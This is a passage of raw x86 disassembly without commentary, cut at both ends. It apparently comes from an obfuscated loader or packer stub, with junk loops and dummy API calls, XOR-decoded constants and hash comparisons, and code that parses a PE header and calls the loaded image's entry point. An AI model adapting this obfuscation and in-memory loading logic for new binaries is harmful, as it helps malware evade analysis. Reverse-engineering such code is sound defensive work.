  409566:	mov    DWORD PTR ds:0x42efa4,0x19
  409570:	cmp    DWORD PTR ds:0x42efa4,0x0
  409577:	je     0x40961e
  40957d:	cmp    DWORD PTR ds:0x42efa4,0x29
  409584:	jne    0x4095c1
  40958a:	push   DWORD PTR [ebp-0xc]
  40958d:	push   DWORD PTR [ebp-0x1c]
  409590:	push   0x61da
  409595:	push   DWORD PTR [ebp-0xc]
  409598:	push   DWORD PTR [ebp-0x1c]
  40959b:	push   DWORD PTR [ebp-0x20]
  40959e:	push   DWORD PTR [ebp-0x1c]
  4095a1:	push   DWORD PTR [ebp-0x28]
  4095a4:	push   0x400000
  4095a9:	push   DWORD PTR [ebp-0xc]
  4095ac:	push   0x2e1f
  4095b1:	push   0x5a6c
  4095b6:	push   0x7112
  4095bb:	call   DWORD PTR ds:0x42ec38
  4095c1:	xor    edi,edi
  4095c3:	xor    edi,DWORD PTR ds:0x42efa4
  4095c9:	dec    edi
  4095ca:	mov    DWORD PTR ds:0x42efa4,edi
  4095d0:	jmp    0x409570
  4095d5:	and    DWORD PTR ds:0x42e8de,0x0
  4095df:	jmp    0x4095f1
  4095e4:	mov    edi,DWORD PTR ds:0x42e8de
  4095ea:	inc    edi
  4095eb:	mov    DWORD PTR ds:0x42e8de,edi
  4095f1:	cmp    DWORD PTR ds:0x42e8de,0x18
  4095f8:	jae    0x40961e
  4095fe:	cmp    DWORD PTR ds:0x42e8de,0x1f
  409605:	jne    0x409619
  40960b:	push   0x6de3
  409610:	push   DWORD PTR [ebp-0x28]
  409613:	call   DWORD PTR ds:0x42ed3c
  409619:	jmp    0x4095e4
  40961e:	mov    cx,WORD PTR [ebp-0x14]
  409622:	movzx  ecx,cx
  409625:	add    ecx,DWORD PTR [eax]
  409627:	xor    eax,eax
  409629:	mov    DWORD PTR [ebp-0x34],0xf89c8531
  409630:	mov    DWORD PTR [ebp-0x10],ecx
  409633:	mov    edi,0x5a3fc9c
  409638:	add    DWORD PTR ds:0x42e8e2,edx
  40963e:	mov    eax,DWORD PTR [ebp-0x1c]
  409641:	xor    ecx,ecx
  409643:	xor    ecx,DWORD PTR ds:0x430622
  409649:	sub    DWORD PTR ds:0x43060a,ecx
  40964f:	mov    ecx,DWORD PTR [ebp-0xc]
  409652:	or     DWORD PTR ds:0x42efac,0x430622
  40965c:	xor    eax,esi
  40965e:	mov    DWORD PTR ds:0x43062a,0x4c41
  409668:	add    eax,ebx
  40966a:	mov    DWORD PTR ds:0x42e8ee,0x490b
  409674:	cmp    DWORD PTR [ecx],eax
  409676:	jne    0x409a49
  40967c:	mov    DWORD PTR ds:0x42e8de,0x1f
  409686:	cmp    DWORD PTR ds:0x42e8de,0x0
  40968d:	je     0x40972a
  409693:	cmp    DWORD PTR ds:0x42e8de,0xb
  40969a:	jne    0x4096b3
  4096a0:	push   DWORD PTR [ebp-0xc]
  4096a3:	push   0x6e82
  4096a8:	push   0x1d82
  4096ad:	call   DWORD PTR ds:0x42ec54
  4096b3:	cmp    DWORD PTR ds:0x42e8de,0xc
  4096ba:	jne    0x4096cb
  4096c0:	mov    eax,ds:0x42e8de
  4096c5:	dec    eax
  4096c6:	mov    ds:0x42e8de,eax
  4096cb:	mov    eax,ds:0x42e8de
  4096d0:	dec    eax
  4096d1:	mov    ds:0x42e8de,eax
  4096d6:	jmp    0x409686
  4096db:	and    DWORD PTR ds:0x42efa4,0x0
  4096e5:	jmp    0x4096f7
  4096ea:	mov    ecx,DWORD PTR ds:0x42efa4
  4096f0:	inc    ecx
  4096f1:	mov    DWORD PTR ds:0x42efa4,ecx
  4096f7:	cmp    DWORD PTR ds:0x42efa4,0x11
  4096fe:	jae    0x40972a
  409704:	cmp    DWORD PTR ds:0x42efa4,0x1a
  40970b:	jne    0x40971f
  409711:	push   0x430612
  409716:	push   DWORD PTR [ebp-0x1c]
  409719:	call   DWORD PTR ds:0x42ed40
  40971f:	jmp    0x4096ea
  409724:	or     ecx,DWORD PTR ds:0x43060a
  40972a:	mov    eax,DWORD PTR [ebp-0x1c]
  40972d:	mov    DWORD PTR ds:0x42ef94,0x1a
  409737:	cmp    DWORD PTR ds:0x42ef94,0x0
  40973e:	je     0x40977d
  409744:	cmp    DWORD PTR ds:0x42ef94,0x29
  40974b:	jne    0x409769
  409751:	push   0x6cb7
  409756:	push   DWORD PTR [ebp-0x20]
  409759:	push   0x3e46
  40975e:	push   0x42efac
  409763:	call   DWORD PTR ds:0x42ed44
  409769:	xor    ecx,ecx
  40976b:	or     ecx,DWORD PTR ds:0x42ef94
  409771:	dec    ecx
  409772:	mov    DWORD PTR ds:0x42ef94,ecx
  409778:	jmp    0x409737
  40977d:	mov    ecx,DWORD PTR [ebp-0x10]
  409780:	xor    eax,esi
  409782:	adc    DWORD PTR ds:0x43062e,0x39c3
  40978c:	add    eax,ebx
  40978e:	mov    DWORD PTR ds:0x4306ce,0x5e01
  409798:	cmp    DWORD PTR [ecx],eax
  40979a:	jne    0x4098a3
  4097a0:	xor    ecx,ecx
  4097a2:	add    ecx,DWORD PTR ds:0x42ef98
  4097a8:	sub    DWORD PTR ds:0x42e8e2,ecx
  4097ae:	mov    eax,DWORD PTR [ebp-0x1c]
  4097b1:	xor    ecx,ecx
  4097b3:	mov    ecx,DWORD PTR [ebp-0x44]
  4097b6:	inc    DWORD PTR ds:0x4306c6
  4097bc:	xor    eax,esi
  4097be:	and    DWORD PTR ds:0x42e8da,0x0
  4097c8:	mov    edx,DWORD PTR ds:0x42e8da
  4097ce:	inc    edx
  4097cf:	mov    DWORD PTR ds:0x42e8da,edx
  4097d5:	cmp    DWORD PTR ds:0x42e8da,0x11
  4097dc:	jne    0x4097f0
  4097e2:	push   0x4306d6
  4097e7:	push   DWORD PTR [ebp-0x10]
  4097ea:	call   DWORD PTR ds:0x42ec58
  4097f0:	cmp    DWORD PTR ds:0x42e8da,0x10
  4097f7:	jne    0x40980a
  4097fd:	mov    edx,DWORD PTR ds:0x42e8da
  409803:	inc    edx
  409804:	mov    DWORD PTR ds:0x42e8da,edx
  40980a:	cmp    DWORD PTR ds:0x42e8da,0x1c
  409811:	jb     0x4097c8
  409817:	add    eax,ebx
  409819:	sbb    edx,0x5b8
  40981f:	mov    DWORD PTR [ecx],eax
  409821:	mov    DWORD PTR ds:0x4306c2,0x1c
  40982b:	cmp    DWORD PTR ds:0x4306c2,0x0
  409832:	je     0x40987c
  409838:	cmp    DWORD PTR ds:0x4306c2,0xd
  40983f:	jne    0x409850
  409845:	push   0x4366
  40984a:	call   DWORD PTR ds:0x42ed48
  409850:	cmp    DWORD PTR ds:0x4306c2,0xe
  409857:	jne    0x40986a
  40985d:	mov    edx,DWORD PTR ds:0x4306c2
  409863:	dec    edx
  409864:	mov    DWORD PTR ds:0x4306c2,edx
  40986a:	mov    edx,DWORD PTR ds:0x4306c2
  409870:	dec    edx
  409871:	mov    DWORD PTR ds:0x4306c2,edx
  409877:	jmp    0x40982b
  40987c:	mov    eax,DWORD PTR [ebp-0x44]
  40987f:	mov    ecx,DWORD PTR [ebp-0x34]
  409882:	adc    DWORD PTR ds:0x42ef94,ebx
  409888:	xor    ecx,esi
  40988a:	xor    DWORD PTR ds:0x4306ca,edi
  409890:	mov    edx,0xffcd8d63
  409895:	and    DWORD PTR ds:0x430622,0x42e8f2
  40989f:	sub    edx,ecx
  4098a1:	add    DWORD PTR [eax],edx
  4098a3:	and    DWORD PTR ds:0x43063a,0x0
  4098ad:	jmp    0x4098bd
  4098b2:	mov    eax,ds:0x43063a
  4098b7:	inc    eax
  4098b8:	mov    ds:0x43063a,eax
  4098bd:	cmp    DWORD PTR ds:0x43063a,0x11
  4098c4:	jae    0x40990a
  4098ca:	cmp    DWORD PTR ds:0x43063a,0xb
  4098d1:	jne    0x4098eb
  4098d7:	push   DWORD PTR [ebp-0x14]
  4098da:	push   DWORD PTR [ebp-0x10]
  4098dd:	push   0x45e3
  4098e2:	push   DWORD PTR [ebp-0x1c]
  4098e5:	call   DWORD PTR ds:0x42ed4c
  4098eb:	cmp    DWORD PTR ds:0x43063a,0xa
  4098f2:	jne    0x409903
  4098f8:	mov    eax,ds:0x43063a
  4098fd:	inc    eax
  4098fe:	mov    ds:0x43063a,eax
  409903:	jmp    0x4098b2
  409908:	not    eax
  40990a:	mov    eax,ds:0x41227c
  40990f:	mov    eax,DWORD PTR [eax]
  409911:	sub    DWORD PTR ds:0x430642,0x430626
  40991b:	mov    cx,WORD PTR [ebp-0x14]
  40991f:	and    DWORD PTR ds:0x42ef9c,0x42e8ee
  409929:	movzx  ecx,cx
  40992c:	add    ecx,DWORD PTR [eax]
  40992e:	and    DWORD PTR ds:0x42ef94,0x0
  409938:	jmp    0x40994b
  40993d:	xor    eax,eax
  40993f:	add    eax,DWORD PTR ds:0x42ef94
  409945:	inc    eax
  409946:	mov    ds:0x42ef94,eax
  40994b:	cmp    DWORD PTR ds:0x42ef94,0x1d
  409952:	jae    0x409980
  409958:	cmp    DWORD PTR ds:0x42ef94,0x1f
  40995f:	jne    0x409975
  409965:	push   0x887a
  40996a:	push   0x3c32
  40996f:	call   DWORD PTR ds:0x42ec60
  409975:	jmp    0x40993d
  40997a:	adc    eax,DWORD PTR ds:0x43061e
  409980:	mov    DWORD PTR [ebp-0x10],ecx
  409983:	sub    DWORD PTR ds:0x42e8de,0x488b
  40998d:	mov    eax,DWORD PTR [ebp-0x30]
  409990:	xor    ecx,ecx
  409992:	add    ecx,DWORD PTR ds:0x430642
  409998:	xor    ecx,DWORD PTR ds:0x43063e
  40999e:	mov    DWORD PTR ds:0x430642,ecx
  4099a4:	mov    ecx,DWORD PTR [ebp-0x30]
  4099a7:	xor    eax,esi
  4099a9:	sbb    DWORD PTR ds:0x430636,0x42ef94
  4099b3:	add    eax,eax
  4099b5:	and    DWORD PTR ds:0x42e8ea,0x42ef88
  4099bf:	xor    ecx,esi
  4099c1:	sub    DWORD PTR ds:0x43063a,0x1a55
  4099cb:	sub    ecx,eax
  4099cd:	or     DWORD PTR ds:0x430632,0x430642
  4099d7:	mov    ax,WORD PTR [ebp-0x14]
  4099db:	sub    DWORD PTR ds:0x42e8de,0x42e8ea
  4099e5:	movzx  eax,ax
  4099e8:	sub    ecx,ebx
  4099ea:	mov    DWORD PTR ds:0x42e8f2,0x4be2
  4099f4:	cmp    eax,ecx
  4099f6:	mov    DWORD PTR ds:0x4306c6,0x6841
  409a00:	mov    eax,DWORD PTR [ebp-0x34]
  409a03:	movzx  ecx,WORD PTR [ebp-0x14]
  409a07:	mov    DWORD PTR ds:0x42e8da,0x46e
  409a11:	jg     0x409a30
  409a17:	xor    eax,esi
  409a19:	sub    ecx,eax
  409a1b:	adc    DWORD PTR ds:0x430606,0x4306d2
  409a25:	sub    ecx,ebx
  409a27:	mov    WORD PTR [ebp-0x14],cx
  409a2b:	jmp    0x409a49
  409a30:	not    DWORD PTR ds:0x42e8de
  409a36:	xor    eax,esi
  409a38:	lea    eax,[eax+ecx*1+0x32729d]
  409a3f:	mov    DWORD PTR ds:0x4306da,ebx
  409a45:	mov    WORD PTR [ebp-0x14],ax
  409a49:	mov    ecx,DWORD PTR [ebp-0x28]
  409a4c:	not    eax
  409a4e:	mov    eax,0x8e12febc
  409a53:	mov    DWORD PTR ds:0x42e8ee,0x41a
  409a5d:	cmp    ecx,eax
  409a5f:	mov    DWORD PTR ds:0x42e8ee,0x60ce
  409a69:	je     0x409a9b
  409a6f:	mov    DWORD PTR ds:0x42ef90,0x7d2b
  409a79:	mov    eax,DWORD PTR [ebp-0xc]
  409a7c:	mov    DWORD PTR ds:0x43061a,0x4b8f
  409a86:	mov    DWORD PTR [eax],0x60341e8d
  409a8c:	mov    DWORD PTR ds:0x42e8de,0x3193
  409a96:	jmp    0x409daf
  409a9b:	mov    ecx,DWORD PTR [ebp-0x28]
  409a9e:	cmp    ecx,0x5142ddba
  409aa4:	jne    0x409bad
  409aaa:	mov    DWORD PTR ds:0x4306ce,ecx
  409ab0:	mov    eax,DWORD PTR [ebp-0xc]
  409ab3:	mov    DWORD PTR ds:0x43063e,0x644d
  409abd:	mov    DWORD PTR [eax],0x4214feba
  409ac3:	mov    eax,DWORD PTR [ebp-0xc]
  409ac6:	mov    DWORD PTR ds:0x4306da,0x1ed6
  409ad0:	mov    DWORD PTR [ebp-0x4],eax
  409ad3:	mov    DWORD PTR ds:0x4306ca,edx
  409ad9:	mov    eax,DWORD PTR [ebp-0x30]
  409adc:	mov    eax,DWORD PTR [ebp-0x1c]
  409adf:	mov    DWORD PTR [ebp-0x4c],edi
  409ae2:	mov    eax,0xff7
  409ae7:	mov    eax,DWORD PTR [ebp-0x4c]
  409aea:	mov    DWORD PTR [ebp-0x8],0x4eb9
  409af1:	cmp    eax,edi
  409af3:	mov    DWORD PTR ds:0x4306d2,0x7826
  409afd:	jne    0x409daf
  409b03:	add    DWORD PTR ds:0x42ef8c,0x42e8de
  409b0d:	mov    ax,WORD PTR [ebp-0x8]
  409b11:	sbb    ecx,DWORD PTR ds:0x43063a
  409b17:	mov    ecx,0x8a40
  409b1c:	xor    ax,cx
  409b1f:	xor    ecx,DWORD PTR ds:0x42ef8c
  409b25:	mov    ecx,0x3b06
  409b2a:	add    ax,cx
  409b2d:	mov    ecx,DWORD PTR [ebp-0x4]
  409b30:	movzx  eax,ax
  409b33:	sub    DWORD PTR ds:0x4306c6,0x42efa8
  409b3d:	not    eax
  409b3f:	sbb    DWORD PTR ds:0x42e8ea,0x43061a
  409b49:	and    eax,DWORD PTR [ecx]
  409b4b:	mov    ecx,DWORD PTR [ebp-0x4]
  409b4e:	mov    DWORD PTR ds:0x43062a,0x2700
  409b58:	mov    DWORD PTR [ecx],eax
  409b5a:	jmp    0x409b70
  409b5f:	and    DWORD PTR ds:0x42e8de,0x4306ce
  409b69:	xor    DWORD PTR [ebp-0x4c],0xe149ebc
  409b70:	mov    ax,WORD PTR [ebp-0x8]
  409b74:	not    DWORD PTR ds:0x430642
  409b7a:	push   DWORD PTR [ebp-0x4]
  409b7d:	adc    DWORD PTR ds:0x42efa8,0x430616
  409b87:	call   0x401000
  409b8c:	xor    DWORD PTR ds:0x42efa4,0x7536
  409b96:	test   eax,eax
  409b98:	mov    DWORD PTR ds:0x430606,0x7cfd
  409ba2:	je     0x409b5f
  409ba8:	jmp    0x409daf
  409bad:	movzx  ecx,WORD PTR ds:0x430616
  409bb4:	mov    ecx,DWORD PTR [ebp-0x28]
  409bb7:	cmp    ecx,0x1443fcbd
  409bbd:	jne    0x409bef
  409bc3:	mov    DWORD PTR ds:0x430622,0x6608
  409bcd:	mov    eax,DWORD PTR [ebp-0xc]
  409bd0:	mov    DWORD PTR ds:0x43060e,0x8ce
  409bda:	mov    DWORD PTR [eax],0x60062d8f
  409be0:	mov    DWORD PTR ds:0x43063a,0x323c
  409bea:	jmp    0x409daf
  409bef:	mov    DWORD PTR ds:0x430622,0x6595
  409bf9:	mov    ecx,DWORD PTR [ebp-0x28]
  409bfc:	mov    DWORD PTR ds:0x42e8f6,0x5912
  409c06:	cmp    ecx,eax
  409c08:	jne    0x409d34
  409c0e:	sbb    DWORD PTR ds:0x43063e,edx
  409c14:	mov    eax,DWORD PTR [ebp-0x1c]
  409c17:	and    DWORD PTR ds:0x4306c2,0x28ff
  409c21:	mov    ecx,DWORD PTR [ebp-0xc]
  409c24:	mov    DWORD PTR ds:0x4306c6,0x5e2a
  409c2e:	xor    eax,esi
  409c30:	xor    DWORD PTR ds:0x4306c6,0x42ef8c
  409c3a:	add    eax,ebx
  409c3c:	cmp    DWORD PTR [ecx],eax
  409c3e:	je     0x409cc1
  409c44:	mov    ecx,DWORD PTR [ebp-0x54]
  409c47:	mov    eax,DWORD PTR [ebp-0xc]
  409c4a:	mov    eax,DWORD PTR [eax]
  409c4c:	mov    eax,DWORD PTR [eax+0x3c]
  409c4f:	lea    ecx,[ecx*8+0x78]
  409c56:	add    eax,ecx
  409c58:	mov    ecx,DWORD PTR [ebp-0xc]
  409c5b:	mov    ecx,DWORD PTR [ecx]
  409c5d:	mov    eax,DWORD PTR [eax+ecx*1]
  409c60:	mov    DWORD PTR [ebp-0x8],eax
  409c63:	mov    eax,DWORD PTR [ebp-0x1c]
  409c66:	xor    eax,esi
  409c68:	add    eax,ebx
  409c6a:	mov    DWORD PTR [ebp-0x4],eax
  409c6d:	mov    eax,DWORD PTR [ebp-0x1c]
  409c70:	mov    ecx,DWORD PTR [ebp-0x8]
  409c73:	xor    eax,esi
  409c75:	add    eax,ebx
  409c77:	cmp    ecx,eax
  409c79:	je     0x409daf
  409c7f:	mov    eax,DWORD PTR [ebp-0xc]
  409c82:	mov    ecx,DWORD PTR [ebp-0x8]
  409c85:	add    ecx,DWORD PTR [eax]
  409c87:	mov    DWORD PTR [ebp-0x4],ecx
  409c8a:	mov    eax,DWORD PTR [ebp-0x4]
  409c8d:	mov    ecx,DWORD PTR [ebp-0xc]
  409c90:	mov    eax,DWORD PTR [eax+0xc]
  409c93:	mov    ecx,DWORD PTR [ecx]
  409c95:	mov    al,BYTE PTR [eax+ecx*1]
  409c98:	add    al,0x36
  409c9a:	xor    al,0x48
  409c9c:	cmp    al,0xc9
  409c9e:	je     0x409cb5
  409ca4:	mov    eax,DWORD PTR [ebp-0x1c]
  409ca7:	mov    ecx,DWORD PTR [ebp-0xc]
  409caa:	xor    eax,esi
  409cac:	add    eax,ebx
  409cae:	mov    DWORD PTR [ecx],eax
  409cb0:	jmp    0x409daf
  409cb5:	xor    DWORD PTR [ebp-0x28],0x5fd8f
  409cbc:	jmp    0x409daf
  409cc1:	mov    eax,DWORD PTR [ebp-0xc]
  409cc4:	mov    ecx,DWORD PTR [ebp-0x10]
  409cc7:	mov    ecx,DWORD PTR [ecx]
  409cc9:	mov    DWORD PTR [eax],ecx
  409ccb:	mov    eax,DWORD PTR [ebp-0xc]
  409cce:	mov    DWORD PTR [ebp-0x4],eax
  409cd1:	mov    eax,DWORD PTR [ebp-0x30]
  409cd4:	mov    eax,DWORD PTR [ebp-0x1c]
  409cd7:	mov    DWORD PTR [ebp-0x5c],edi
  409cda:	mov    eax,DWORD PTR [ebp-0x5c]
  409cdd:	mov    DWORD PTR [ebp-0x8],0x4eb9
  409ce4:	cmp    eax,edi
  409ce6:	jne    0x409daf
  409cec:	mov    ax,WORD PTR [ebp-0x8]
  409cf0:	mov    ecx,0x8a40
  409cf5:	xor    ax,cx
  409cf8:	mov    ecx,0x3b06
  409cfd:	add    ax,cx
  409d00:	mov    ecx,DWORD PTR [ebp-0x4]
  409d03:	movzx  eax,ax
  409d06:	not    eax
  409d08:	and    eax,DWORD PTR [ecx]
  409d0a:	mov    ecx,DWORD PTR [ebp-0x4]
  409d0d:	mov    DWORD PTR [ecx],eax
  409d0f:	jmp    0x409d1b
  409d14:	xor    DWORD PTR [ebp-0x5c],0xe149ebc
  409d1b:	mov    ax,WORD PTR [ebp-0x8]
  409d1f:	push   DWORD PTR [ebp-0x4]
  409d22:	call   0x401000
  409d27:	test   eax,eax
  409d29:	je     0x409d14
  409d2f:	jmp    0x409daf
  409d34:	mov    eax,DWORD PTR [ebp-0x28]
  409d37:	cmp    eax,0x33450cad
  409d3c:	jne    0x409daf
  409d42:	mov    eax,DWORD PTR [ebp-0xc]
  409d45:	mov    DWORD PTR [eax],0x443dc9d
  409d4b:	mov    eax,DWORD PTR [ebp-0xc]
  409d4e:	mov    DWORD PTR [ebp-0x4],eax
  409d51:	mov    eax,DWORD PTR [ebp-0x30]
  409d54:	mov    eax,DWORD PTR [ebp-0x1c]
  409d57:	mov    DWORD PTR [ebp-0x40],edi
  409d5a:	mov    eax,DWORD PTR [ebp-0x40]
  409d5d:	mov    DWORD PTR [ebp-0x8],0x4eb9
  409d64:	cmp    eax,edi
  409d66:	jne    0x409daf
  409d6c:	mov    ax,WORD PTR [ebp-0x8]
  409d70:	mov    ecx,0x8a40
  409d75:	xor    ax,cx
  409d78:	mov    ecx,0x3b06
  409d7d:	add    ax,cx
  409d80:	mov    ecx,DWORD PTR [ebp-0x4]
  409d83:	movzx  eax,ax
  409d86:	not    eax
  409d88:	and    eax,DWORD PTR [ecx]
  409d8a:	mov    ecx,DWORD PTR [ebp-0x4]
  409d8d:	mov    DWORD PTR [ecx],eax
  409d8f:	jmp    0x409d9b
  409d94:	xor    DWORD PTR [ebp-0x40],0xe149ebc
  409d9b:	mov    ax,WORD PTR [ebp-0x8]
  409d9f:	push   DWORD PTR [ebp-0x4]
  409da2:	call   0x401000
  409da7:	test   eax,eax
  409da9:	je     0x409d94
  409daf:	mov    eax,DWORD PTR [ebp-0x28]
  409db2:	cmp    eax,0x8e12febc
  409db7:	je     0x409638
  409dbd:	mov    eax,DWORD PTR [ebp-0xc]
  409dc0:	mov    eax,ds:0x4121a8
  409dc5:	mov    eax,DWORD PTR [eax+0x18c]
  409dcb:	mov    eax,DWORD PTR [eax]
  409dcd:	mov    DWORD PTR [ebp-0x74],eax
  409dd0:	mov    eax,0xf89c8531
  409dd5:	mov    DWORD PTR [ebp-0x10],eax
  409dd8:	mov    DWORD PTR [ebp-0x10],eax
  409ddb:	mov    DWORD PTR [ebp-0x10],eax
  409dde:	mov    DWORD PTR [ebp-0x10],0xf89c8535
  409de5:	mov    DWORD PTR [ebp-0x8],eax
  409de8:	mov    DWORD PTR [ebp-0x8],0xf89c853d
  409def:	mov    edi,DWORD PTR [ebp-0x20]
  409df2:	xor    edi,esi
  409df4:	add    edi,ebx
  409df6:	jmp    0x409e31
  409dfb:	mov    eax,DWORD PTR [ebp-0x18]
  409dfe:	xor    eax,esi
  409e00:	lea    eax,[eax+edi*1+0x32729d]
  409e07:	push   eax
  409e08:	mov    eax,DWORD PTR [ebp-0x10]
  409e0b:	xor    eax,esi
  409e0d:	lea    eax,[ebp+eax*1+0x3272a5]
  409e14:	push   eax
  409e15:	mov    eax,ds:0x4121a8
  409e1a:	push   DWORD PTR [eax+0x1bc]
  409e20:	call   0x4052e7
  409e25:	mov    eax,DWORD PTR [ebp-0x18]
  409e28:	xor    eax,esi
  409e2a:	lea    edi,[edi+eax*1+0x32729d]
  409e31:	mov    eax,DWORD PTR [ebp-0x18]
  409e34:	mov    ecx,DWORD PTR [ebp-0x18]
  409e37:	xor    ecx,esi
  409e39:	xor    eax,esi
  409e3b:	add    eax,ecx
  409e3d:	mov    ecx,DWORD PTR [ebp-0x18]
  409e40:	xor    ecx,esi
  409e42:	lea    eax,[eax+ecx*1+0x9757d7]
  409e49:	cmp    edi,eax
  409e4b:	jbe    0x409dfb
  409e51:	mov    eax,DWORD PTR [ebp+0xc]
  409e54:	mov    ds:0x41202c,eax
  409e59:	mov    eax,DWORD PTR [ebp+0x10]
  409e5c:	mov    ds:0x412280,eax
  409e61:	mov    eax,ds:0x41202c
  409e66:	mov    ecx,DWORD PTR [ebp-0x60]
  409e69:	sub    eax,ebx
  409e6b:	xor    eax,esi
  409e6d:	mov    DWORD PTR [ecx],eax
  409e6f:	mov    eax,DWORD PTR [ebp-0x58]
  409e72:	cmp    eax,0xf89c8532
  409e77:	je     0x409ed4
  409e7d:	mov    eax,DWORD PTR [ebp-0x20]
  409e80:	mov    ecx,DWORD PTR [ebp-0x50]
  409e83:	xor    eax,esi
  409e85:	add    eax,ebx
  409e87:	cmp    eax,ecx
  409e89:	je     0x409ed4
  409e8f:	mov    eax,ds:0x4121a8
  409e94:	mov    eax,DWORD PTR [eax+0x194]
  409e9a:	mov    ecx,DWORD PTR [eax]
  409e9c:	mov    eax,DWORD PTR [ecx+0x3c]
  409e9f:	push   DWORD PTR ds:0x412280
  409ea5:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  409ea9:	push   DWORD PTR ds:0x41202c
  409eaf:	add    eax,ecx
  409eb1:	mov    ecx,DWORD PTR ds:0x4121a8
  409eb7:	mov    ecx,DWORD PTR [ecx+0x194]
  409ebd:	push   DWORD PTR [ecx]
  409ebf:	call   eax
  409ec1:	mov    ecx,DWORD PTR ds:0x4121a8
  409ec7:	mov    ecx,DWORD PTR [ecx+0x1cc]
  409ecd:	mov    DWORD PTR [ecx],eax
  409ecf:	jmp    0x40a18e
  409ed4:	mov    eax,DWORD PTR [ebp-0x20]
  409ed7:	mov    ecx,DWORD PTR [ebp-0x74]
  409eda:	xor    eax,esi
  409edc:	add    eax,ebx
  409ede:	mov    edi,0xf89c85f5
  409ee3:	cmp    eax,ecx
  409ee5:	jne    0x409fe6
  409eeb:	mov    eax,DWORD PTR [ebp-0x20]
  409eee:	xor    eax,esi
  409ef0:	add    eax,ebx
  409ef2:	mov    ds:0x41222c,eax
  409ef7:	mov    eax,DWORD PTR [ebp-0x20]
  409efa:	xor    eax,esi
  409efc:	add    eax,ebx
  409efe:	mov    ds:0x412224,eax
  409f03:	mov    eax,DWORD PTR [ebp-0x18]
  409f06:	mov    DWORD PTR [ebp-0x8],eax
  409f09:	mov    eax,DWORD PTR [ebp-0x20]
  409f0c:	mov    DWORD PTR [ebp+0xc],eax
  409f0f:	mov    eax,DWORD PTR [ebp+0xc]
  409f12:	xor    eax,esi
  409f14:	add    eax,ebx
  409f16:	mov    DWORD PTR [ebp+0xc],eax
  409f19:	mov    eax,ds:0x412028
  409f1e:	mov    eax,DWORD PTR [eax]
  409f20:	mov    DWORD PTR [ebp+0xc],eax
  409f23:	mov    eax,ds:0x412230
  409f28:	mov    eax,DWORD PTR [eax]
  409f2a:	mov    DWORD PTR [ebp-0x60],eax
  409f2d:	mov    DWORD PTR [ebp+0x10],0xf89c8735
  409f34:	mov    eax,DWORD PTR [ebp+0x10]
  409f37:	xor    eax,esi
  409f39:	add    eax,ebx
  409f3b:	mov    DWORD PTR [ebp+0x10],eax
  409f3e:	mov    eax,ds:0x4121a8
  409f43:	mov    DWORD PTR [ebp+0x10],eax
  409f46:	mov    eax,DWORD PTR [ebp+0xc]
  409f49:	mov    DWORD PTR [ebp+0x10],eax
  409f4c:	mov    eax,DWORD PTR [ebp+0x10]
  409f4f:	push   0x4
  409f51:	pop    ecx
  409f52:	sub    ecx,eax
  409f54:	add    ecx,DWORD PTR [ebp-0x60]
  409f57:	mov    DWORD PTR [ebp-0x34],edi
  409f5a:	mov    DWORD PTR [ebp-0x10],ecx
  409f5d:	mov    DWORD PTR [ebp-0xc8],0xf89c8531
  409f67:	mov    eax,DWORD PTR [ebp+0x10]
  409f6a:	mov    DWORD PTR [ebp-0xc4],eax
  409f70:	mov    eax,DWORD PTR [ebp-0x10]
  409f73:	mov    DWORD PTR [ebp-0xc0],eax
  409f79:	mov    eax,DWORD PTR [ebp-0x34]
  409f7c:	xor    eax,esi
  409f7e:	add    eax,ebx
  409f80:	mov    DWORD PTR [ebp-0xbc],eax
  409f86:	lea    eax,[ebp-0x80]
  409f89:	mov    DWORD PTR [ebp-0xb8],eax
  409f8f:	mov    eax,DWORD PTR [ebp-0xc8]
  409f95:	xor    eax,esi
  409f97:	add    eax,ebx
  409f99:	mov    DWORD PTR [ebp-0xc8],eax
  409f9f:	lea    eax,[ebp-0xc8]
  409fa5:	push   eax
  409fa6:	mov    eax,DWORD PTR [ebp-0x8]
  409fa9:	xor    eax,esi
  409fab:	add    eax,ebx
  409fad:	push   eax
  409fae:	mov    eax,ds:0x4121c8
  409fb3:	push   0x41211e
  409fb8:	push   DWORD PTR [eax]
  409fba:	call   0x40b2c8
  409fbf:	and    DWORD PTR [ebp+0xc],0x0
  409fc3:	mov    eax,DWORD PTR [ebp-0x10]
  409fc6:	sub    eax,DWORD PTR [ebp+0xc]
  409fc9:	push   eax
  409fca:	mov    eax,DWORD PTR [ebp+0x10]
  409fcd:	add    eax,DWORD PTR [ebp+0xc]
  409fd0:	push   eax
  409fd1:	call   0x403861
  409fd6:	inc    DWORD PTR [ebp+0xc]
  409fd9:	cmp    DWORD PTR [ebp+0xc],0x52
  409fdd:	jb     0x409fc3
  409fe3:	mov    eax,DWORD PTR [ebp-0x8]
  409fe6:	mov    eax,ds:0x4121a8
  409feb:	mov    DWORD PTR [ebp+0x10],eax
  409fee:	mov    eax,ds:0x4122b4
  409ff3:	mov    DWORD PTR [ebp-0x68],eax
  409ff6:	mov    DWORD PTR [ebp+0xc],0xf89c8535
  409ffd:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  40a004:	mov    eax,DWORD PTR [ebp+0xc]
  40a007:	xor    eax,esi
  40a009:	add    eax,ebx
  40a00b:	mov    DWORD PTR [ebp-0x7c],eax
  40a00e:	mov    DWORD PTR [ebp-0x70],0xf89cb535
  40a015:	mov    DWORD PTR [ebp-0x84],0xf89f0535
  40a01f:	mov    DWORD PTR [ebp-0x78],edi
  40a022:	mov    DWORD PTR [ebp-0x64],0xf89c85d5
  40a029:	mov    eax,DWORD PTR [ebp+0xc]
  40a02c:	xor    eax,esi
  40a02e:	add    eax,ebx
  40a030:	mov    DWORD PTR [ebp-0x38],eax
  40a033:	mov    DWORD PTR [ebp-0x48],0xf89c853e
  40a03a:	mov    BYTE PTR [ebp-0x29],0x57
  40a03e:	mov    eax,DWORD PTR [ebp+0xc]
  40a041:	xor    eax,esi
  40a043:	add    eax,ebx
  40a045:	mov    DWORD PTR [ebp-0x38],eax
  40a048:	mov    eax,DWORD PTR [ebp-0x64]
  40a04b:	xor    eax,esi
  40a04d:	add    eax,ebx
  40a04f:	push   eax
  40a050:	mov    eax,DWORD PTR [ebp-0x70]
  40a053:	xor    eax,esi
  40a055:	add    eax,ebx
  40a057:	push   eax
  40a058:	mov    eax,DWORD PTR [ebp-0x48]
  40a05b:	xor    eax,esi
  40a05d:	add    eax,ebx
  40a05f:	push   eax
  40a060:	lea    eax,[ebp-0x10c]
  40a066:	push   eax
  40a067:	push   DWORD PTR [ebp+0xc]
  40a06a:	push   DWORD PTR [ebp-0x4]
